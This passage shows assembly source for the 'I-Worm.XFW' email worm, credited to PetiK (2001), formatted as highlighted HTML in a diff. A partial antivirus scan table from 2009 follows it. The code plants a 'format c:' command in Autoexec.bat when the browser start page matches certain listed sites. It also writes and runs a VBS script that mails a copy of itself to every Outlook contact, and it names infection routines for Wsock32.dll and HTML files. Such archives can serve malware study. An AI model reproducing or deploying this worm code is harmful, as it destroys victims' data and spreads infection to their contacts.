+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FORMAT</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"http://www.front-national.fr"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FORMAT</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"http://www.lepen-tv.com"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FORMAT</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"http://www.hammerskins.com"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FORMAT</span><span class="sc0">
+    </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">INET</span><span class="sc0">
+
+</span><span class="sc5">FORMAT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">40000000h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\Autoexec.bat"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">BATSIZE</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">batd</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+    </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">FIN</span><span class="sc0">
+
+</span><span class="sc5">INET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"WININET.dll"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">WNEThdl</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"InternetCheckConnectionA"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WNEThdl</span><span class="sc0">   
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">netcheck</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+</span><span class="sc5">VNET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">netcheck</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">VNET</span><span class="sc0">
+</span><span class="sc5">FNET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">WNEThdl</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Internet"</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"You're connected"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+
+</span><span class="sc5">VBS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">40000000h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\Win.vbs"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets2</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">VBSSIZE</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbsd</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"wscript C:\Win.vbs"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\Win.vbs"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">
+
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc1">; ========== INSTALLATION ========== </span><span class="sc0">
+</span><span class="sc5">a_wsck</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">n_wsck</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szCopie</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szOrig</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">Winini</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">windir</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc1">; ============ INFECTION 1 ===========</span><span class="sc0">
+</span><span class="sc5">WsckHdl</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">filesize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">WsckMap</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">WsckView</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc1">; ============ INFECTION 2 ===========</span><span class="sc0">
+</span><span class="sc5">htmlHdl</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">szCurFolder</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+
+</span><span class="sc1">; =============== EMail ==============</span><span class="sc0">
+</span><span class="sc5">RegHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc9">Page</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">PageSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
+</span><span class="sc5">ValueType</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">WNEThdl</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">netcheck</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">octets2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">WormName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I-Worm.XFW coded by PetiK (c)2001 "</span><span class="sc0">
+</span><span class="sc5">Origine</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Made In France"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+</span><span class="sc5">txtd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"To restore Wsock32.dll :"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"extract /a D:\WIN98\precopy1.cab wsock32.dll /L C:\WINDOWS\SYSTEM"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc5">TXTSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">txtd</span><span class="sc0">
+
+</span><span class="sc5">batd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"echo y | format c: /U /V:FuckYou"</span><span class="sc0">
+    </span><span class="sc5">BATSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">batd</span><span class="sc0">
+
+</span><span class="sc5">SYSTIME</span><span class="sc0">     </span><span class="sc9">struct</span><span class="sc0">
+</span><span class="sc5">wYear</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMonth</span><span class="sc0">          </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wDayOfWeek</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wDay</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wHour</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMinute</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wSecond</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMillisecond</span><span class="sc0">        </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">SYSTIME</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">
+
+</span><span class="sc5">MAX_PATH</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+
+</span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc9">struct</span><span class="sc0">
+</span><span class="sc5">dwLowDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">dwHighDateTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">FILETIME</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
+</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">struct</span><span class="sc0">
+</span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">dwReserved0</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">dwReserved1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">cFileName</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
+
+</span><span class="sc5">SystemTime</span><span class="sc0">  </span><span class="sc5">SYSTIME</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
+</span><span class="sc5">Search</span><span class="sc0">      </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
+
+</span><span class="sc5">vbsd</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set K = CreateObject("Outlook.Application")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set L = K.GetNameSpace("MAPI")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'For Each M In L.AddressLists'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'If M.AddressEntries.Count &lt;&gt; 0 Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'For O = 1 To M.AddressEntries.Count'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set P = M.AddressEntries(O)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set N = K.CreateItem(0)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.To = P.Address'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.Subject = "Xtra game for you"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.Body = "This is for you"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set Q = CreateObject("Scripting.FileSystemObject")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(1),"Services.exe")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.DeleteAfterSubmit = True'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'If N.To &lt;&gt; "" Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N.Send'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End If'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End If'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">VBSSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">vbsd</span><span class="sc0">
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">DEBUT</span><span class="sc0">
+</span><span class="sc9">end</span><span class="sc0">
+</span>
+<span class="sc0"><table border="1"><tr><td colspan="4">File XFW.exe received on 2009.06.10 04:23:46 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">VBS.Lee.Based!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">Win32/PetTick.5632</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">Worm/Petik.D1</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/Win32.Win32</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">W32/Malware!e65e</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">Win32:XFW</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">I-Worm/Petik</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Generic.Malware.Msp!.D18236D7</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">I-Worm.Petik</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">Worm.Petik.D2</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Worm.Win32.Petik.AB</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">Win32.Petik.8192</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">Win32.WormPetik.D</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">Win32/Petik.5632.C!intended</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">W32/Malware!e65e</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">W32/Petik!worm</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Generic.Malware.Msp!.D18236D7</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W32/PetTick@MM</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">Artemis!CA27691BF213</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Worm.Petik.D1</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Worm:Win32/Pet_tik.F</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">Win32/Petik.AB</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W32/Petik.AC</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">Worm/W32.Petik.5632</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">W32/Petik.D</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">I-Worm.Petxfw.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td style="color: red;">Medium Risk Malware</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Worm.XFW</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">W32/XfW</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td style="color: red;">Worm.Petik</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W95.Pet_Tick.gen</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td style="color: red;">W32/Petik</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: 